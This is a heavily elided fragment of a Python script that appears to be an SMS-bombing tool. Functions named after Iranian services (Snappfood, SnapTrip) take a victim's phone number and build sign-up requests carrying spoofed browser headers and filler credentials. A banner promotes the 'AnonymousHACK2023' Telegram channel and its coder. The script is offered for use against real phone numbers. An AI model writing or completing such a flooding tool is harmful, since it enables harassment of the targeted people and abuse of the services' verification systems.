...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        pass
    # Telegram: iran13891389  - :)
    # Telegram: @Anonymoushack2023 - :)
def snapfood(phone):
...
def sTrip(phone):
    ...
    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+98")[1],"country_code":"+98","email":"iran138913899@gmail.com"}
    try:
...
if __name__ == '__main__':
    def printLow(Str):
        for char in Str:
            ...
            sleep(.01)
    printLow(f'''{r}++++++++++++++++++++++++++++
{w} Telegram : T.me/AnonymousHACK2023++
{g} +++++++++++++++++++++++++

{y}Info:
    {g}[+] {y}Coder: {w}@iran13891389
    {g}[+] {y}TelegramChannel: {w}https://t.me/Anonymoushack2023
